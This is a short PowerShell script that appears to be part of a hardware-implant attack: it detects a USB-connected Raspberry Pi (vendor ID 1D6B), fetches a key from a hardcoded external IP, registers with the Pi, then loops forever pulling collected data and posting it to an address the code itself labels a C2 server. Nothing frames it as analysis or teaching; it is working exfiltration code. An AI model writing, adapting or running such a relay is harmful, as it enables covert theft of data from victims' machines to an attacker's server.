$raspberryPiUrl = "http://10.0.0.1/retrieve_data"
$c2ServerUrl = "http://218.212.190.105/receive_ml_data.php"
$base_url = "http://10.0.0.1"
$key = 'http://218.212.190.105/get_public_key.php'

try {
	$pub_key = Invoke-WebRequest -Uri $key -UseBasicParsing
	Write-Host "Retrieved public key from web server." -ForegroundColor Green
} catch {
	Write-Error "Failed to retrieve public key from web server: $_"
	return
}

# Send public key to Flask server in JSON format
$key_data = @{PuK = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($pub_key.tostring()))}
$completed = $false

function Is_Connected {
    $check = $null
    $check = Get-PnpDevice -PresentOnly | Where-Object { $_.InstanceId -match '^USB\\VID_1D6B' }

    if ($null -ne $check) {
        return 'FOUND'
    }
}

if (Is_Connected) {
    try {
        $response = Invoke-WebRequest -Uri $base_url -Method POST -Body ($key_data | ConvertTo-Json) -ContentType 'application/json'
        $uuid = ($response.content | ConvertFrom-Json).uuid
        $completed = $true
    }
    catch {
        Write-Host "Failed to get UUID"
    }
}

while ($true) {
    $response = Invoke-RestMethod -Uri $raspberryPiUrl -Method GET
    if ($response.status -eq "success") {
        foreach ($data in $response.data) {
            # Add UUID to the data
            $data.uuid = $uuid
            # Process and forward the data to the C2 server
            $sendResponse = Invoke-RestMethod -Uri $c2ServerUrl -Method POST -Body ($data | ConvertTo-Json) -ContentType "application/json"
        }
    }
    Start-Sleep -Seconds 30
}
